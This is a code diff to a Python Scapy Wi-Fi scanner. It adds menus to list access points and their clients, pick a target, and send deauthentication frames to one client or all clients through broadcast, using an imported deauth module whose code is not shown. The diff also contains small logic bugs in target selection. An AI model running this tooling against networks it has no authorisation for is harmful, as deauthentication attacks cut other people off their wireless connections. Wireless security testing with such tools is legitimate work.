@@ -1,13 +1,12 @@
 import os
 import time
-from typing import Union, get_type_hints
+from typing import Union
 from scapy.all import Dot11Beacon, Dot11, Dot11Elt, sniff, Dot11ProbeReq, Dot11ProbeResp
 from threading import Thread
 import pandas
 from getpass import getuser
 from subprocess import PIPE, run
-
-from client import Client
+from deauth import deauth
 from wifi import Wifi
 from utils import get_current_channel
 
@@ -16,10 +15,11 @@ class Scanner:
     """
     Context manager for scanning the network
     """
-    def __init__(self, interface: str):
+    def __init__(self, interface: str, timeout):
         self.wifis: list[Wifi] = []
         self.interface = interface
         self.curr_channel: int
+        self.timeout: int = timeout
 
     def __enter__(self):
         if getuser() != "root":
@@ -65,7 +65,10 @@ class Scanner:
         os.system(f"iw dev {self.interface} set channel {channel}")
         self.curr_channel = channel
 
-    def scan_for_aps(self, timeout: int, specific_ap: str = "") -> pandas.DataFrame:
+    def scan_for_aps(self, timeout: int = 0, specific_ap: str = "") -> pandas.DataFrame:
+        if timeout == 0:
+            timeout = self.timeout
+
         def _callback(packet):
             if packet.haslayer(Dot11Beacon):
                 # extract the MAC address of the network
@@ -122,7 +125,7 @@ class Scanner:
         sniff(prn=_callback, filter="type mgt subtype beacon", iface=self.interface, timeout=timeout)
         return networks
 
-    def get_clients_on_ap_probe(self, timeout: int, iface: str, wifi: Wifi) -> None:
+    def get_clients_on_ap_probe(self, wifi: Wifi, timeout: int = 0, iface: str = "") -> None:
         """Function to create a list of the clients communicating with a certain AP using probe requests and responses
 
         Args:
@@ -130,6 +133,13 @@ class Scanner:
             iface (str): Interface to sniff
             wifi (Wifi): Wifi object to add clients to
         """
+
+        if timeout == 0:
+            timeout = self.timeout
+
+        if not iface:
+            iface = self.interface
+
         def _callback(packet) -> None:
             # Checks conditions, and adds clients to list
             if packet.haslayer(Dot11ProbeReq):
@@ -148,7 +158,7 @@ class Scanner:
         sniff(timeout=timeout, iface=iface, prn=_callback)
         wifi.clients = list(set(client_list))
 
-    def scan_for_clients(self, timeout: int) -> list[str]:
+    def scan_for_clients(self, timeout: int = 0) -> list[str]:
         """Function to populate the clients list of each AP
 
         Args:
@@ -157,6 +167,10 @@ class Scanner:
         Returns:
             list: List of unique clients that are connected to the AP specified
         """
+
+        if timeout == 0:
+            timeout = self.timeout
+
         client_list = []
         wifis_list_of_bssid = [wifi.BSSID for wifi in self.wifis]
 
@@ -230,3 +244,112 @@ class Scanner:
             for wifi in self.wifis:
                 clients.append({"SSID": wifi.SSID, "clients": wifi.get_clients()})
         return clients if clients != [] else []
+
+    def scan_network(self) -> bool:
+        print("Scanning network for APs...")
+        AP_info = self.scan_for_aps()
+        print(AP_info)
+        # print(scanner.wifis)
+
+        # scan network for clients as well
+        print("Scanning network for clients...")
+        self.scan_for_clients()
+        print(self.get_clients())
+
+        return True
+
+    def show_aps(self):
+        # Check if we have scanned the network. If so, show APs from scanner.wifis
+        if self.wifis:
+            # Print APs in a nice way
+            for i, wifi in enumerate(self.wifis):
+                print(f"{i}. {wifi.SSID} - {wifi.BSSID}")
+
+            # Prompt user if they want more info on AP
+            more_info = input("Do you want more info on AP? (y/n): ").strip()
+            if more_info == "y":
+                AP_to_show = int(input("Input index of AP to show: "))
+                print(self.wifis[AP_to_show])
+
+        else:
+            print("No APs found. Try scanning network first.")
+            return False
+
+    def prompt_for_ap(self) -> Wifi:
+        """
+        Check if we have scanned the network. If so, we can prompt user for AP to attack from scanner.wifis
+        Then in scanner.wifis find the AP with the same BSSID as the one we scanned for
+        Then check if we found the AP
+        """
+        def _get_targeted_ap() -> Wifi:
+            AP_to_attack_str = input("Input AP BSSID for client scan: ")
+            print("Scanning network for selected AP...")
+            self.scan_for_aps(specific_ap=AP_to_attack_str)
+            # in scanner.wifis find the AP with the same BSSID as the one we scanned for
+            for wifi in self.wifis:
+                if wifi.BSSID == AP_to_attack_str:
+                    target_ap = wifi
+                    break
+            # check if we found the AP
+            if not target_ap:
+                print("Could not find AP in scanned APs. Try scanning network first.")
+                return False
+            return target_ap
+
+        if self.wifis:
+            print("Choose AP from list: ")
+            for i, wifi in enumerate(self.wifis):
+                print(f"{i}. {wifi.SSID} - {wifi.BSSID}")
+            print(f"{len(self.wifis)+1}. User defined AP")
+            AP_to_attack = int(input("Input index of AP to attack: "))
+            if AP_to_attack == len(self.wifis) + 1:
+                target_ap = _get_targeted_ap()
+            target_ap = self.wifis[AP_to_attack]
+        else:
+            print("No APs found. Try scanning network first.")
+            return False
+        return target_ap
+
+    def show_clients(self) -> bool:
+        target_ap = self.prompt_for_ap()
+        print(f"Extracting client list for AP: {target_ap.SSID}")
+        # Get clients from AP
+        if target_ap.clients:
+            print("Clients on AP:")
+            # Print clients using target_ap.get_clients(), shown as i. client.mac - ssid
+            clients = target_ap.get_clients()
+            for i, client in enumerate(clients):
+                print(f"{i}. {client['MAC']} - {client['SSID']}")
+        else:
+            print("No clients found on AP.")
+            # prompt if user wants to seach for clients on AP
+            search_for_clients = input("Do you want to search for clients on AP? (y/n): ").strip()
+            if search_for_clients == "y":
+                self.scan_for_clients()
+        return True
+
+    def send_deauth(self):
+        target_ap = self.prompt_for_ap()
+        self.set_channel(target_ap.channel)
+
+        # Check if we have clients on the AP. If so, prompt user for client to deauth
+        if target_ap.clients:
+            print("Choose client to deauth from list:")
+            for i, client in enumerate(target_ap.clients):
+                print(f"{i}. {client}")
+            print(f"{len(target_ap.clients)+1}. User defined client")
+            print(f"{len(target_ap.clients)+2}. Deauth all clients")
+            client_to_deauth = int(input("Input choice: "))
+
+            if client_to_deauth == len(target_ap.clients) + 1:
+                target_client = input("Input client MAC for deauth: ")
+            elif client_to_deauth == len(target_ap.clients) + 2:
+                target_client = "ff:ff:ff:ff:ff:ff"
+            else:
+                target_client = target_ap.clients[client_to_deauth]
+
+        # If we don't have clients on the AP, prompt user for client to deauth
+        else:
+            target_client = input("Input client MAC for deauth: ")
+
+        deauth(self.interface, target_ap.BSSID, target_client)
